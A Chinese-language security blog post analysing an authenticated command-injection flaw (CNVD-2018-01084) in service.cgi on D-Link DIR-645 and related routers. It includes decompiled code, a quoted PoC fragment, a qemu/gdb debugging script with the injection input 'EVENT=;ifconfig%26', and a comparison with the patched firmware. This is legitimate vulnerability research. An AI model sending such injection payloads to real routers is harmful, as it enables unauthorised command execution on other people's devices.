---
layout: post
title:  "D-Link service.cgi远程命令执行漏洞分析"
date:   2019-10-13 21:00:00
categories: Vuln_Analysis
permalink: /archivers/d-link-service_cgi-rce
---


上篇文章分析了信息泄露漏洞，可以获取到密码等信息。此次主要是基于上篇文章的认证，分析该系列设备的认证后的命令执行执行漏洞，该漏洞形成的原因是由于service.cgi在处理HTTP POST请求中的数据不当，形成命令拼接，导致可执行任意命令。

## 漏洞描述

该漏洞编号为[CNVD-2018-01084](https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084)，受影响的型号包括D-Link DIR 615、D-Link DIR 645 、D-Link DIR 815，受影响的固件版本为1.03及之前。该漏洞是由于service.cgi中拼接了HTTP POST请求中的数据，造成后台命令拼接，导致可执行任意命令。

## 漏洞分析

此次的分析仍然是基于dir-645，去官网下载1.03的[固件](ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP)，下载1.04的[固件](ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.04.B11.ZIP)

根据公开的[exp](https://packetstormsecurity.com/files/145859/dlinkroutersservice-exec.txt)中的信息，关键poc如下：

```python
post_content = "EVENT=CHECKFW%26" + command + "%26"
...
URL + "/service.cgi"
```

关键信息为`EVENT`参数以及`service.cgi`页面，上篇文章中我们已经知道处理cgi的程序为`cgibin`，因此主要分析`cgibin`，看它是如何处理post过去的参数的。

`binwalk -Me dir.bin`提取固件，cgibin的文件路径为`htdocs/cgibin`。

### 静态分析

将cgibin拖入到IDA与ghidra中进行分析。

```c
iVar1 = strcmp(argv0,"service.cgi");
if (iVar1 == 0) {
UNRECOVERED_JUMPTABLE = servicecgi_main;
}
```

可以看到`service.cgi`对应的处理函数为`servicecgi_main`，跟进去该函数，关键代码如下：

```c
  memset(acStack280,0,0x100);
  request_method_ptr = getenv("REQUEST_METHOD");
  if (request_method_ptr == (char *)0x0) {
    __format = "No HTTP request";
    goto LAB_0040cf48;
  }
  iVar4 = strcasecmp(request_method_ptr,"POST");
  if (iVar4 == 0) {
    uVar3 = 0x400;
LAB_0040ced0:
    iVar4 = cgibin_parse_request(FUN_0040d1cc,(astruct *)0x0,uVar3);
    if (iVar4 < 0) {
      __format = "Unable to parse HTTP request";
    }
    else {
      iVar4 = sess_ispoweruser();
      if (iVar4 != 0) {
        iVar2 = get_para("EVENT");
        request_method_ptr = (char *)get_para("ACTION");
        iVar4 = get_para("SERVICE");
        if (iVar2 == 0) {
          if ((iVar4 != 0) && (request_method_ptr != (char *)0x0)) {
            iVar2 = strcasecmp(request_method_ptr,"START");
            if (iVar2 == 0) {
              __format = "service %s start > /dev/null";
            }
            else {
              iVar2 = strcasecmp(request_method_ptr,"STOP");
              if (iVar2 == 0) {
                __format = "service %s stop > /dev/null";
              }
              else {
                iVar2 = strcasecmp(request_method_ptr,"RESTART");
                if (iVar2 != 0) {
                  __format = "Unknown action - \'%s\'";
                  goto LAB_0040cf00;
                }
                __format = "service %s restart > /dev/null";
              }
            }
            goto LAB_0040d038;
          }
        }
        else {
          __format = "event %s > /dev/null";
          iVar4 = iVar2;
LAB_0040d038:
          lxmldbc_system(__format,iVar4);
        }
```

首先判断`REQUEST_METHOD`，如果是POST的话则调用`cgibin_parse_request`去解析post参数，该函数也在上篇大致分析过，将参数解析并存入到内存当中，需要提下的是该函数里面对`CONTENG_TYPE`进行判断并调用相应函数去处理，`application/x-www-form-urlencoded`对应的`type`会将参数进行url解码并存储。接着调用`sess_ispoweruser`函数判断传过来的cookie是否是有效cookie，如果有效的话则进去到参数获取阶段，由于可以通过信息泄露漏洞获取密码，所以也可以拿到有效的cookie。

参数获取阶段主要是去获取三个参数`EVENT`、`ACTION`以及`SERVICE`的值，`get_para`的返回值是相应的参数值，不存在该参数时返回0。最后如果是`EVENT`参数存在则调用`lxmldbc_system`，函数代码如下：

```c
void lxmldbc_system(char *format,char *para0,char *para1,char *para2)

{
  char *local_res4;
  char *local_res8;
  char *local_resc;
  char acStack1036 [1028];
  
  local_res4 = para0;
  local_res8 = para1;
  local_resc = para2;
  vsnprintf(acStack1036,0x400,format,&local_res4);
  system(acStack1036);
  return;
}
```

结合调用部分，可以函数使用`vsnprintf`函数将`EVENT`参数与格式化字符串`event %s > /dev/null`构成命令后直接调用`system`去执行。由于对参数没有过滤且可控，所以形成了命令注入漏洞。

除了`EVENT`参数外，也可以使用`ACTION`以及`SERVICE`的组合进行命令注入。`ACTION`如果为`START`、`RESTART`以及`STOP`则会将`SERVICE`的参数构成命令`service %s start > /dev/null`、`service %s restart > /dev/null`以及`service %s stop > /dev/null`，也可以通过`SERVICE`参数形成命令注入漏洞。

### 动态调试

接下来进行动态调试进行验证，用命令`sudo ./cgi_run_service.sh`启动，脚本内容如下：

```bash
#!/bin/bash
# sudo ./cgi_run.sh

INPUT=`python -c "print 'EVENT=;ifconfig%26'"`

LEN=$(echo $INPUT | wc -c)
PORT="1234"


if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT"  | chroot .  ./qemu  -0 "/service.cgi" -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded"  -E REQUEST_METHOD="POST"  -E REQUEST_URI="/service.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT ./htdocs/cgibin "/service.cgi" "/service.cgi" #2>/dev/null
echo "run ok"
rm -f ./qemu
```

由于只是调试单个脚本，所以无法拿到有效的cookie，在这里的做法是断点断在`0x40CF34`，即判断cookie是否有效的处，并将其手动修改成1，便可以继续往下执行，执行到`lxmldbc_system`处。

```c
.text:0040CF20 loc_40CF20:                              # CODE XREF: servicecgi_main+E4↑j
.text:0040CF20                 la      $t9, sess_ispoweruser
.text:0040CF24                 nop
.text:0040CF28                 jalr    $t9 ; sess_ispoweruser
.text:0040CF2C                 nop
.text:0040CF30                 lw      $gp, 0x130+var_120($sp)
.text:0040CF34                 bnez    $v0, loc_40CF58
```

整个动态调试的过程大致如下，可以看到`lxmldbc_system`参数为`event %s > /dev/null`以及`;ifconfig&\n`，最终构成命令`;ifconfig&\n > /dev/null`，命令注入的时候可以不用`&`来结束，用`;`也可以，为的是不要把执行结果重定向到`/dev/null`中，而是返回回来。

```c
0x0040cf34 in servicecgi_main ()
(gdb) x/2i $pc
=> 0x40cf34 <servicecgi_main+316>:      bnez    v0,0x40cf58 <servicecgi_main+352>
   0x40cf38 <servicecgi_main+320>:      lui     a2,0x42
(gdb) i r $v0
v0: 0x0
(gdb) set $v0=1
(gdb) c
Continuing.
Breakpoint 1:
0x0040d038 in servicecgi_main ()
(gdb) x/2i $pc
=> 0x40d038 <servicecgi_main+576>:      jalr    t9
   0x40d03c <servicecgi_main+580>:      nop
(gdb) i r a0 a1
a0: 0x420d10
a1: 0x435108
(gdb) x/s $a0
0x420d10:       "event %s > /dev/null"
(gdb) x/s $a1
0x435108:       ";ifconfig&\n"
(gdb)
```

## 补丁比对

将1.04的cgibin进行分析，发现其关键部分代码发生了一定的变动，不再是使用`lxmldbc_system`调用`system`函数执行命令，而是将用户传入的参数，当成应用程序的参数，最后调用`execel`去执行，规避了命令注入。

```c
        
// 第一部分， 调用解析参数FUN_0040ce38函数
                    else {
          __s1 = "/usr/sbin/event";
          __format = "event";
          pcVar4 = (char *)0x0;
          iVar5 = iVar2;
LAB_0040d180:
          FUN_0040ce38(__s1,__format,iVar5,pcVar4);
        }

//第二部分 FUN_0040ce38函数调用execel
undefined4 FUN_0040ce38(char *pcParm1,char *pcParm2,undefined4 uParm3,undefined4 uParm4)

{
  __pid_t __pid;
  int iVar1;
  undefined4 uVar2;
  
  __pid = fork();
  if ((-1 < __pid) && (__pid == 0)) {
    close(1);
    iVar1 = execl(pcParm1,pcParm2,uParm3,uParm4,0);
    if (iVar1 < 0) {
      return 0xffffffff;
    }
  }
  
```

## 小结

感觉dir系列的洞还挺多的，大概率最新版的固件里面应该也有问题。

相关文件和代码[链接](https://github.com/ray-cp/Vuln_Analysis/tree/master/D-Link-dir-645-rce)

## 参考链接

1. [路由器漏洞挖掘之 DIR-850/645 命令执行漏洞复现](https://www.anquanke.com/post/id/178279)
2. [dlink_auth_rce](https://github.com/ChiefyChief/dlink_shell_poc/blob/master/dlink_auth_rce)
3. [路由器漏洞复现分析第二弹：CNVD-2018-01084](https://www.freebuf.com/vuls/162627.html)

文章先发于[先知](https://xz.aliyun.com/t/6525)社区。

